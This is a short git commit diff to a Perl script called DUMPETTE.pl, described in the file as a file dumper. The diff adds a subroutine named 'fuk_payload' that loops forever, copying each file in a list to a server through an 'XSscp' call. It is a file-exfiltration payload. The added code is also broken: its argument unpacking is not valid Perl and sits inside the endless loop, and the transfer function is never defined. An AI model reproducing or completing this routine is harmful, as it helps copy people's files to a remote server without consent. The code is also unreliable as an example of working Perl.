a6ff7f35434c65b38ca07bfb665c3a6910e4a392
Prince of Archives <rich.tijerina@gmail.com>
2017-07-28 23:51:55 -0700

    Update DUMPETTE.pl

--- DUMPETTE.pl
+++ DUMPETTE.pl
@@ -1,3 +1,13 @@
 ########################
 # DUMPETTE - file dumper
 
+sub fuk_payload
+{
+	while (1)
+	{
+		my ($server, \@files) = @_;
+		sleep 100 unless defined $files[0];
+		foreach (@files)
+			{ XSscp($server, $_); }
+	}
+}
